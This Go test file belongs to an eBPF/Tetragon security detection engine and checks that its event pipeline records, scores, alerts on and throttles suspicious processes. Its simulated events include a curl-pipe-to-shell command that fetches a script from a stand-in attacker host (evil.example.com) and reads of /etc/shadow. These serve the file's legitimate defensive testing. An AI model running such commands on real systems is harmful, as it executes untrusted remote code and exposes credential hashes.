package eventpipe

import (
	"path/filepath"
	"testing"
	"time"

	"github.com/cilium/tetragon/api/v1/tetragon"
	"google.golang.org/protobuf/types/known/wrapperspb"

	"github.com/jeffmk/ebpf-poc-engine/internal/api"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke/circuit"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke/tokens"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce/bpfmap"
	"github.com/jeffmk/ebpf-poc-engine/internal/policy"
	"github.com/jeffmk/ebpf-poc-engine/internal/store"
	"github.com/jeffmk/ebpf-poc-engine/internal/tree"
)

// This whole path was two copies inside two main() functions, reachable from no
// test at all. The assertions below are the differences between those copies —
// the uplink tee, and the gateway dispatch — plus the ordering guarantees the
// console depends on.

func newPipeline(t *testing.T, withGateway bool) (*Pipeline, chan api.Broadcast) {
	t.Helper()
	dir := t.TempDir()
	st, err := store.New(filepath.Join(dir, "events.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = st.Close() })

	broadcast := make(chan api.Broadcast, 256)
	p := &Pipeline{
		Store:     st,
		Tree:      tree.New(time.Hour),
		Broadcast: broadcast,
	}
	if withGateway {
		be := bpfmap.NewNoopBackend()
		_ = be.Open()
		p.Gateway = choke.NewGateway(choke.Config{
			Store: st, Tokens: tokens.NewManager(), Tree: p.Tree,
			BPFMap: be, Policies: policy.NewSet(),
			Enforcer:  &enforce.Multi{Backends: []enforce.Enforcer{&enforce.Throttler{Backend: be}}},
			Enforcing: true,
			Thresholds: circuit.Config{
				ThrottleAt: 5, TarpitAt: 15, QuarantineAt: 25, SeverAt: 40,
			},
		})
	}
	return p, broadcast
}

func proc(execID string, pid, uid uint32, binary, args string) *tetragon.Process {
	return &tetragon.Process{
		ExecId:    execID,
		Pid:       wrapperspb.UInt32(pid),
		Uid:       wrapperspb.UInt32(uid),
		Binary:    binary,
		Arguments: args,
	}
}

func drain(ch chan api.Broadcast) []api.Broadcast {
	var out []api.Broadcast
	for {
		select {
		case b := <-ch:
			out = append(out, b)
		default:
			return out
		}
	}
}

// An exec has to land in the tree, in the store, and on the SSE stream. The
// store insert happens first on purpose: the console must never receive an
// event id it cannot then fetch.
func TestHandleExecRecordsScoresAndBroadcasts(t *testing.T) {
	p, ch := newPipeline(t, false)
	p.HandleExec(&tetragon.ProcessExec{
		Process: proc("exec-1", 1001, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/p.sh | sh"),
	})

	if _, ok := p.Tree.Get("exec-1"); !ok {
		t.Fatal("exec never joined the process tree — nothing downstream can score its chain")
	}
	if got := p.Tree.ChainScore("exec-1"); got == 0 {
		t.Error("a curl-pipe-to-shell scored 0")
	}
	msgs := drain(ch)
	var sawEvent, sawAlert bool
	for _, m := range msgs {
		switch m.Type {
		case "event":
			sawEvent = true
			e, ok := m.Payload.(*store.Event)
			if !ok {
				t.Fatalf("event payload type %T", m.Payload)
			}
			if e.ID == 0 {
				t.Error("event broadcast before it had a store id — the console cannot drill into it")
			}
		case "alert":
			sawAlert = true
		}
	}
	if !sawEvent {
		t.Error("no event broadcast")
	}
	if !sawAlert {
		t.Error("a score above the alert threshold produced no alert")
	}
}

func TestHandleExecIgnoresIncompleteEvents(t *testing.T) {
	p, ch := newPipeline(t, false)
	p.HandleExec(nil)
	p.HandleExec(&tetragon.ProcessExec{})
	p.HandleKprobe(nil)
	p.HandleKprobe(&tetragon.ProcessKprobe{})
	if got := drain(ch); len(got) != 0 {
		t.Fatalf("%d broadcasts from incomplete events, want 0", len(got))
	}
}

// The kprobe path renders its arguments before scoring them, so a policy hit on
// /etc/shadow has to score on the path, not on an empty string. The exec comes
// first because a chain score only exists for a node the tree knows.
func TestHandleKprobeScoresRenderedArgs(t *testing.T) {
	p, _ := newPipeline(t, false)
	p.HandleExec(&tetragon.ProcessExec{Process: proc("exec-2", 2002, 0, "/bin/cat", "")})
	p.HandleKprobe(&tetragon.ProcessKprobe{
		Process:    proc("exec-2", 2002, 0, "/bin/cat", ""),
		PolicyName: "sensitive-file-access",
		Args: []*tetragon.KprobeArgument{
			{Arg: &tetragon.KprobeArgument_FileArg{FileArg: &tetragon.KprobeFile{Path: "/etc/shadow"}}},
		},
	})
	if got := p.Tree.ChainScore("exec-2"); got == 0 {
		t.Error("a /etc/shadow policy hit scored 0 — the rendered args never reached the scorer")
	}
}

// The ONE difference between the engine's copy of this path and the agent's was
// these two taps. With them nil the agent's behaviour must be exactly the
// engine's: no uplink, and no nil dereference on the enforcement path.
func TestSinksAreOptional(t *testing.T) {
	p, _ := newPipeline(t, false)
	p.HandleExec(&tetragon.ProcessExec{
		Process: proc("exec-3", 3003, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/p.sh | sh"),
	})
}

// And with them set, every stored event and alert must be teed — a record that
// reaches the local store but not the buffer is a hole in the fleet's telemetry
// that nothing else reports.
func TestSinksReceiveEveryStoredRecord(t *testing.T) {
	p, _ := newPipeline(t, false)
	var events []*store.Event
	var alerts []*store.Alert
	p.EventSink = func(e *store.Event) { events = append(events, e) }
	p.AlertSink = func(a *store.Alert) { alerts = append(alerts, a) }

	p.HandleExec(&tetragon.ProcessExec{
		Process: proc("exec-4", 4004, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/p.sh | sh"),
	})
	p.HandleKprobe(&tetragon.ProcessKprobe{
		Process:    proc("exec-4", 4004, 0, "/usr/bin/curl", ""),
		PolicyName: "sensitive-file-access",
		Args: []*tetragon.KprobeArgument{
			{Arg: &tetragon.KprobeArgument_FileArg{FileArg: &tetragon.KprobeFile{Path: "/etc/shadow"}}},
		},
	})

	if len(events) != 2 {
		t.Errorf("uplink saw %d events, want 2", len(events))
	}
	for _, e := range events {
		if e.ID == 0 {
			t.Error("an event was teed to the uplink without a store id")
		}
	}
	if len(alerts) == 0 {
		t.Error("no alert reached the uplink — the control plane would show this host as quiet")
	}
}

// Chain scores are cumulative and never fall, so alerting per event made 91 of
// 100 alerts critical on a measured run. One alert per escalation, not per
// event — while enforcement still sees every event.
func TestRepeatedEventsInTheSameBandAlertOnce(t *testing.T) {
	p, ch := newPipeline(t, false)
	p.HandleExec(&tetragon.ProcessExec{Process: proc("exec-5", 5005, 0, "/bin/cat", "")})
	for i := 0; i < 5; i++ {
		p.HandleKprobe(&tetragon.ProcessKprobe{
			Process:    proc("exec-5", 5005, 0, "/bin/cat", ""),
			PolicyName: "sensitive-file-access",
			Args: []*tetragon.KprobeArgument{
				{Arg: &tetragon.KprobeArgument_FileArg{FileArg: &tetragon.KprobeFile{Path: "/etc/shadow"}}},
			},
		})
	}
	alerts := 0
	for _, m := range drain(ch) {
		if m.Type == "alert" {
			alerts++
		}
	}
	if alerts == 0 {
		t.Fatal("five sensitive-file hits produced no alert at all")
	}
	if alerts > 2 {
		t.Errorf("%d alerts from one escalating chain — the escalation guard is not holding", alerts)
	}
}

// Enforcement is not gated on the alert threshold: the gateway sees every
// event, so a chain can be throttled before it has ever produced an alert.
func TestGatewaySeesEveryEvent(t *testing.T) {
	p, _ := newPipeline(t, true)
	p.HandleExec(&tetragon.ProcessExec{
		Process: proc("exec-6", 6006, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/p.sh | sh"),
	})
	var found bool
	for _, c := range p.Gateway.Snapshot() {
		if c.ExecID == "exec-6" {
			found = true
			if c.State == circuit.Pristine.String() {
				t.Errorf("gateway saw the chain but left it pristine at score %d", c.Score)
			}
		}
	}
	if !found {
		t.Error("the gateway never saw the event — a scored chain would go uncontained")
	}
}

// A nil gateway is what a not-yet-wired startup and every test gets. It must be
// a no-op, not a panic that takes the sensing loop down with it.
func TestNilGatewayIsANoOp(t *testing.T) {
	p, _ := newPipeline(t, false)
	p.HandleExec(&tetragon.ProcessExec{
		Process: proc("exec-7", 7007, 1000, "/bin/bash", "-c 'echo hi'"),
	})
}

// Handle is the only entry point the stream loop uses; each arm has to reach
// its handler, and an exit must broadcast without touching the event store.
func TestHandleRoutesEachEventKind(t *testing.T) {
	p, ch := newPipeline(t, false)
	p.Handle(&tetragon.GetEventsResponse{
		Event: &tetragon.GetEventsResponse_ProcessExec{
			ProcessExec: &tetragon.ProcessExec{Process: proc("exec-8", 8008, 1000, "/bin/bash", "")},
		},
	})
	p.Handle(&tetragon.GetEventsResponse{
		Event: &tetragon.GetEventsResponse_ProcessKprobe{
			ProcessKprobe: &tetragon.ProcessKprobe{
				Process: proc("exec-8", 8008, 1000, "/bin/bash", ""), PolicyName: "outbound-connections",
			},
		},
	})
	p.Handle(&tetragon.GetEventsResponse{
		Event: &tetragon.GetEventsResponse_ProcessExit{
			ProcessExit: &tetragon.ProcessExit{Process: proc("exec-8", 8008, 1000, "/bin/bash", "")},
		},
	})

	var events, exits int
	for _, m := range drain(ch) {
		switch m.Type {
		case "event":
			events++
		case "process_exit":
			exits++
		}
	}
	if events != 2 {
		t.Errorf("%d event broadcasts, want 2 (exec + kprobe)", events)
	}
	if exits != 1 {
		t.Errorf("%d exit broadcasts, want 1", exits)
	}
}
